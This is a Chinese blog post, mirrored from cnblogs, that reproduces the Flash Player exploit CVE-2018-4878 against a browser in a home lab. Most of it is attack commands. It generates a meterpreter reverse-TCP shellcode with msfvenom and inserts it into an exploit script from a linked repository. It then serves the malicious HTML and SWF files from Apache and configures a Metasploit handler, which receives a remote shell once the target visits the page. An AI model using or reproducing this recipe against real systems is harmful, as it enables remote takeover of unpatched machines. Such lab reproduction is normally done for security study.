# Flash 零日漏洞复现（CVE-2018-4878） - Sch01aR# - 博客园

> 原文：[`www.cnblogs.com/sch01ar/p/8575441.html`](https://www.cnblogs.com/sch01ar/p/8575441.html)

项目地址：https://github.com/Sch01ar/CVE-2018-4878.git

影响版本为：Adobe Flash Player <= 28.0.0.137

攻击机器 IP：192.168.220.152

目标靶机：192.168.220.151，浏览器为 360 浏览器

用 msfvenom 生成一个 shellcode

```
┌─[root@sch01ar]─[~]
└──╼ #msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.220.152 lport=6666 -f python>shellcode.txt

```

 获取 shellcode.txt 的内容

```
┌─[root@sch01ar]─[~]
└──╼ #cat shellcode.txt

```

![](img/d1bca10396be2b2843aed87b79e9c6c2.png)

把 shellcode.txt 里的内容替换 cve-2018-4878.py 中的 shellcode 内容

![](img/1e63f1d3acaa4ccb899909a3aba21c5c.png)

运行 exp

```
┌─[root@sch01ar]─[~/CVE-2018-4878]
└──╼ #python cve-2018-4878.py

```

![](img/1612930eca058562f990971b84124f99.png)

 把 exploit.html 和 exploit.swf 移到/var/www/html/下

```
┌─[root@sch01ar]─[~/CVE-2018-4878]
└──╼ #cp exploit.swf /var/www/html/
┌─[root@sch01ar]─[~/CVE-2018-4878]
└──╼ #cp exploit.html /var/www/html/

```

 开启 apache2 服务

```
┌─[root@sch01ar]─[~/CVE-2018-4878]
└──╼ #service apache2 start

```

 开启 msf

```
┌─[✗]─[root@sch01ar]─[~]
└──╼ #msfconsole

```

 然后一系列的配置，开启监听

```
msf > use exploit/multi/handler
msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(handler) > set lhost 192.168.220.152
lhost => 192.168.220.152
msf exploit(handler) > set lport 6666
lport => 6666
msf exploit(handler) > exploit -j

```

 ![](img/60f19de48cc49902c91b8465df7aa503.png)

用靶机的 360 浏览器打开地址：http://192.168.220.152/exploit.html

![](img/f62407924ab39f48c384dc01b21fbba9.png)

msf 会返回一个会话

![](img/7b90c1ee6261d444f53b3d710ae1e09f.png)

执行命令

![](img/28c917c36cb8921b05ec4b56089db710.png)